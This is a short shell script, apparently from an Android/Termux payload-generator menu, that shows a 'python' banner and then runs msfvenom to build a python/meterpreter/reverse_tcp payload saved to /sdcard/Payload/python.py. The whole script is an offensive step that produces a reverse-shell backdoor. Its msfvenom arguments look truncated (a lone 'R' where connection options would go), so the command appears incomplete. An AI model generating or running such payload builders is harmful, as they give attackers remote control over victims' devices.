p() {
	clear
	echo -e "\033[1;92m"
	figlet python
	echo
	printf "\n Please wait.."
	msfvenom -p python/meterpreter/reverse_tcp R > /sdcard/Payload/python.py
	printf "\n Completed\n\n"
	}
	p